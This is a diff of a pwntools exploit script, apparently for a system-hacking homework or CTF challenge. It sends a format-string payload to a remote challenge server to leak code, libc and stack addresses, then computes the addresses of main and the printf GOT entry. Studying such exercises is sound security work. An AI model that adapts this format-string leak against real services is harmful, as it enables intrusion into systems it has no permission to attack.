@@ -5,18 +5,18 @@ p = remote("52.79.50.147", port)
 libc = ELF('./WHS/system_hacking_hw/problem/libc.so.6',checksec=False)
 
 #leak part start
-pay = b'%70$p%71$p%72$p'
+pay = b'%75$p%71$p%72$p'
 p.sendlineafter(b'post?\n',pay)
 p.recvuntil(b'post:\n')
 code_leak = int(p.recv(14),16)
 libc_leak = int(p.recv(14),16)
 stack_leak = int(p.recv(14),16)
 
-print('code leak = ',hex(code_leak))
-print('libc leak = ',hex(libc_leak))
-print('stack leak = ',hex(stack_leak))
+print('main: ',hex(code_leak))
+print('libc: ',hex(libc_leak))
+# print('stack leak = ',hex(stack_leak))
 
-main = code_leak - 0xbb
+main = code_leak
 print('main func addr = ',hex(main))
 printf = main + 0x2e63
 print('printf got addr = ',hex(printf))
